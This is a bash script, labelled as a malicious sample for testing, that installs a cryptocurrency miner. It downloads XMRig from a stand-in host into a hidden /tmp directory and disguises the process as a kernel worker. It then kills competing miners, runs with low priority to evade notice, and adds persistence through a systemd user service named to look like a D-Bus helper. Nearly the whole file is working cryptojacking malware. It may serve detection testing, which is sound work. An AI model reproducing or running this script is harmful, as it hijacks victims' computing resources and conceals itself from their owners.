#!/usr/bin/env bash
# MALICIOUS SCRIPT - FOR TESTING PURPOSES ONLY
# Installs and runs cryptocurrency miner, hides from detection

MINER_URL="http://evil.pool.com/xmrig"
WALLET="44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A"
POOL="stratum+tcp://pool.minexmr.com:4444"

echo "Installing miner..."

# Download miner to hidden location
mkdir -p /tmp/.X11-unix/.cache
curl -s -o /tmp/.X11-unix/.cache/xmrig "$MINER_URL"
chmod +x /tmp/.X11-unix/.cache/xmrig

# Rename process to look legitimate
cp /tmp/.X11-unix/.cache/xmrig /tmp/.X11-unix/.cache/[kworker/0:0]

# Kill competing miners
pkill -f xmrig 2>/dev/null
pkill -f minerd 2>/dev/null
pkill -f cryptonight 2>/dev/null

# Run miner with low priority to avoid detection
nice -n 19 /tmp/.X11-unix/.cache/[kworker/0:0] -o "$POOL" -u "$WALLET" -p x --background --cpu-max-threads-hint=50

# Add persistence via systemd user service
mkdir -p ~/.config/systemd/user
cat > ~/.config/systemd/user/dbus-helper.service << EOF
[Unit]
Description=D-Bus Helper Service

[Service]
ExecStart=/tmp/.X11-unix/.cache/[kworker/0:0] -o $POOL -u $WALLET -p x
Restart=always

[Install]
WantedBy=default.target
EOF

systemctl --user enable dbus-helper.service 2>/dev/null

echo "Miner installed and running"
